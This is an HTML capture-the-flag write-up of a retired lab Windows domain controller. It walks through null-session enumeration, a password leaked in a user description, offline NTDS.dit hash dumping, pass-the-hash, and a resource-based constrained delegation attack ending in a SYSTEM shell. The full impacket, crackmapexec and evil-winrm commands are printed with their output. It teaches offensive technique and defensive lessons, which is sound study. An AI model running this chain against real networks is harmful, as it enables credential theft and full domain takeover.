@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Resourced &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Resourced</h1>
+    <div class="meta">Target: <code>192.168.229.175</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">ActiveDirectory</span><span class="tag">NullSession</span><span class="tag">PasswordInDescription</span><span class="tag">NTDS</span><span class="tag">PassTheHash</span><span class="tag">BloodHound</span><span class="tag">RBCD</span><span class="tag">S4U2Proxy</span><span class="tag">PSExec</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#nmap">Nmap</a><a class="lvl3" href="#anonymous-rpc-enumeration-password-in-description">Anonymous RPC Enumeration, Password in Description</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#smb-password-audit-share-with-ntds-dit">SMB, Password Audit Share with NTDS.dit</a><a class="lvl3" href="#hash-spray-winrm-access-as-l-livingstone">Hash Spray, WinRM Access as L.Livingstone</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#bloodhound-genericall-on-resourcedc">BloodHound, GenericAll on RESOURCEDC$</a><a class="lvl3" href="#rbcd-attack-creating-a-fake-computer-and-abusing-s4u2proxy">RBCD Attack, Creating a Fake Computer and Abusing S4U2Proxy</a><a class="lvl2" href="#root-system">Root / SYSTEM</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Resourced is an Active Directory Domain Controller box that chains four distinct techniques into a full domain compromise. Unauthenticated RPC enumeration exposes a password stored in an LDAP user description field. That credential unlocks an SMB share containing <code>NTDS.dit</code> and the SYSTEM hive, an offline dump of the entire domain's credential database. One of those hashes authenticates over WinRM. BloodHound then reveals that account has <code>GenericAll</code> over the DC computer object, enabling a Resource-Based Constrained Delegation (RBCD) attack to forge an Administrator service ticket and PSExec as SYSTEM.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap          Domain: resourced.local
+445/tcp  open  microsoft-ds
+3268/tcp open  ldap          (GlobalCatalog)
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+</code></pre>
+<p>DC hostname: <code>RESOURCEDC</code>. Domain: <code>resourced.local</code>. SMB signing required (prevents relay attacks).</p>
+<h3 id="anonymous-rpc-enumeration-password-in-description">Anonymous RPC Enumeration, Password in Description</h3>
+<p><code>enum4linux-ng</code> against the DC with a null session returned the full user list via <code>querydispinfo</code>. One account description read:</p>
+<pre><code>V.Ventz : 'New-hired, reminder: HotelCalifornia194!'
+</code></pre>
+<blockquote>
+<p><strong>Why LDAP user descriptions leak secrets:</strong> Active Directory's <code>description</code> attribute on user objects is readable by any authenticated (and sometimes unauthenticated) user. Admins sometimes put temporary passwords, reminder notes, or onboarding credentials in the description field. Enum4linux and <code>ldapsearch</code> both dump these during standard enumeration. It's one of the first places to look after gaining any domain account.</p>
+</blockquote>
+<p>Valid domain credentials from unauthenticated enumeration:</p>
+<pre><code>V.Ventz : HotelCalifornia194!
+</code></pre>
+<h2 id="foothold">Foothold</h2>
+<h3 id="smb-password-audit-share-with-ntds-dit">SMB, Password Audit Share with NTDS.dit</h3>
+<p>Authenticating with V.Ventz's credentials revealed a non-standard share:</p>
+<pre><code>Password Audit    READ ONLY
+</code></pre>
+<p>The share contained two files:
+- <code>NTDS.dit</code>, the Active Directory database, holding every domain credential
+- <code>SYSTEM</code>, the registry hive needed to decrypt the NTDS encryption keys</p>
+<p>Both were downloaded via <code>smbclient</code>.</p>
+<blockquote>
+<p><strong>What NTDS.dit is and why it's the jackpot:</strong> NTDS.dit is the Active Directory database stored on every Domain Controller. It contains NT hashes for every domain account, including krbtgt, all administrators, and every user. The hashes are encrypted with the Boot Key, which is stored in the SYSTEM registry hive. With both files, <code>impacket-secretsdump</code> decrypts and dumps every hash in the domain offline, with no network traffic to the DC.</p>
+</blockquote>
+<p>Offline hash extraction:</p>
+<pre><code class="language-sh">impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL \
+  -outputfile ntlm
+</code></pre>
+<p>Selected hashes from the dump:</p>
+<pre><code>Administrator:500:‹redacted›:‹redacted›:::
+L.Livingstone:1105:‹redacted›:‹redacted›:::
+V.Ventz:1107:‹redacted›:‹redacted›:::
+</code></pre>
+<h3 id="hash-spray-winrm-access-as-l-livingstone">Hash Spray, WinRM Access as L.Livingstone</h3>
+<p>All extracted hashes were sprayed against SMB:</p>
+<pre><code class="language-sh">crackmapexec smb 192.168.229.175 -u usernames.txt -H hashes --continue-on-success
+</code></pre>
+<p>Positive results for <code>L.Livingstone</code> and <code>V.Ventz</code>. L.Livingstone authenticated over WinRM:</p>
+<pre><code class="language-sh">evil-winrm -u 'L.Livingstone' -H ‹redacted› -i 192.168.229.175
+</code></pre>
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\L.Livingstone\Desktop&gt; type local.txt
+‹redacted›
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="bloodhound-genericall-on-resourcedc">BloodHound, GenericAll on RESOURCEDC$</h3>
+<p>BloodHound collection revealed that <code>L.Livingstone</code> held <code>GenericAll</code> over the <code>RESOURCEDC$</code> computer object. With <code>GenericAll</code>, the account can modify the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute, the RBCD control attribute, on the DC's computer object.</p>
+<p>The plan: create a new machine account (any authenticated user can do this by default, up to the <code>MachineAccountQuota</code> limit), configure the DC to trust that fake machine for delegation, then use S4U2Proxy to get a service ticket impersonating Administrator.</p>
+<h3 id="rbcd-attack-creating-a-fake-computer-and-abusing-s4u2proxy">RBCD Attack, Creating a Fake Computer and Abusing S4U2Proxy</h3>
+<p>Step 1, Create the fake computer account:</p>
+<pre><code class="language-sh">impacket-addcomputer resourced.local/l.livingstone \
+  -dc-ip 192.168.229.175 \
+  -hashes :‹redacted› \
+  -computer-name 'ATTACK$' \
+  -computer-pass 'AttackerPC1!'
+
+[*] Successfully added machine account ATTACK$ with password AttackerPC1!.
+</code></pre>
+<p>Step 2, Write delegation rights using <code>rbcd.py</code>:</p>
+<pre><code class="language-sh">sudo python3 rbcd.py -dc-ip 192.168.229.175 -t RESOURCEDC -f 'ATTACK' \
+  -hashes :‹redacted› resourced\\l.livingstone
+
+[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `ATTACK` into
+    msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `RESOURCEDC`
+[*] Delegation rights modified succesfully!
+[*] ATTACK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
+</code></pre>
+<blockquote>
+<p><strong>How RBCD works:</strong> Resource-Based Constrained Delegation lets a computer object declare which other accounts are allowed to impersonate users on its behalf. Normally only domain admins set this. With <code>GenericAll</code> over a computer object, any account can write this attribute, pointing it at an attacker-controlled machine account. The S4U2Proxy extension then lets that machine account request service tickets <em>as any user</em>, including Administrator, for services on the target machine. The KDC sees this as a legitimate delegation chain.</p>
+</blockquote>
+<p>Step 3, Request an Administrator service ticket via S4U2Proxy:</p>
+<pre><code class="language-sh">impacket-getST -spn cifs/resourcedc.resourced.local \
+  resourced/attack\$:'AttackerPC1!' \
+  -impersonate Administrator \
+  -dc-ip 192.168.229.175
+
+[*] Impersonating Administrator
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
+</code></pre>
+<p>Exporting the ticket:</p>
+<pre><code class="language-sh">export KRB5CCNAME=./Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
+</code></pre>
+<h2 id="root-system">Root / SYSTEM</h2>
+<p>Pass-the-ticket with PSExec using the forged Administrator CIFS ticket:</p>
+<pre><code class="language-sh">sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.229.175
+
+[*] Found writable share ADMIN$
+[*] Uploading file pebhtsYK.exe
+[*] Creating service wUkq on resourcedc.resourced.local.....
+[*] Starting service wUkq.....
+
+C:\Windows\system32&gt; whoami
+nt authority\system
+</code></pre>
+<pre><code class="language-powershell">C:\Users\Administrator\Desktop&gt; type proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>LDAP user descriptions are a free credential store.</strong> An unauthenticated RPC null session handed over a plaintext onboarding password left in a description field, no exploitation needed.</li>
+<li><strong>A "Password Audit" share containing NTDS.dit is the entire domain's keyring.</strong> Any authenticated read of that share produces every NT hash in the domain offline. Classify and monitor non-standard SMB shares as carefully as you would SAM hives.</li>
+<li><strong>RBCD requires only <code>GenericAll</code> over a computer object and <code>MachineAccountQuota &gt; 0</code>.</strong> Both conditions are common in default AD configurations. BloodHound surfaces the path; the full chain from hash to SYSTEM spans four impacket commands.</li>
+<li><strong>Pass-the-ticket with PSExec leaves no password in transit.</strong> The Administrator Kerberos TGS was forged entirely offline; the DC validated it by decrypting the CIFS service ticket with its own key. No password authentication, no Kerberos TGT request for the Administrator account.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
